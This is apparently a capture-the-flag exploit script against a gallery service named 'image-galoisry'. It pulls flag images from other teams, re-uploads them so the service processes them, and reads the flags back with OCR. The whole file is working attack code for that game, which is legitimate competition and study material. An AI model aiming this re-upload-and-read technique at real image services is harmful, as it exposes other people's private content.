#!/usr/bin/env python3
import os
import sys
sys.path.insert(1, '../imports/')
sys.path.insert(1, 'imports/')

import utils
import os
import requests
import json
import shutil
from random import randint

from PIL import Image
import pytesseract

# Use this function to print stuff to client
def log(message):
    print(message, flush=True)

IP_ADDRESS = sys.argv[1]
TEAM = IP_ADDRESS.split(":")[2] # IPv6
dir_path = os.path.dirname(os.path.realpath(__file__)) + '/../'
flag_ids = {}
with open(dir_path + 'flag_ids.json', 'r', encoding='utf-8') as f:
    flag_ids = json.loads(f.read())
    #log(flag_ids)

# Adjust if needed
SERVICE = "image-galoisry"
PORT = 5005
TARGET_URL = f'http://[{IP_ADDRESS}]:{PORT}'

valid_ips = flag_ids.get(SERVICE, {})
valid_users = valid_ips.get(TEAM, [])
if TEAM not in valid_ips:
    print("No")
    exit(0)

for user in valid_users:
    flagid = json.loads(user)
    gallery = flagid["gallery"]
    filename = flagid["filename"]
    newFilename = filename.split(".")[0] + str(randint(1000, 9999)) + ".png"
    print(newFilename)

    pic = requests.get(TARGET_URL + f"/gallery/{gallery}/download/{filename}", stream=True).raw
    pic.decode_content=True

    filedict = {
        "mediafile": (newFilename, pic.read())
    }
    print("Uploading!")
    requests.post(TARGET_URL + f"/gallery/{gallery}/upload", files=filedict)

    print("Downloading!")
    newPic = requests.get(TARGET_URL + f"/gallery/{gallery}/download/{newFilename}", stream=True).raw
    newPic.decode_content=True

    f = open(f"/tmp/{newFilename}", "wb")
    shutil.copyfileobj(newPic, f)
    f.close()
    
    log(pytesseract.image_to_string(f"/tmp/{newFilename}"))
    os.remove(f"/tmp/{newFilename}")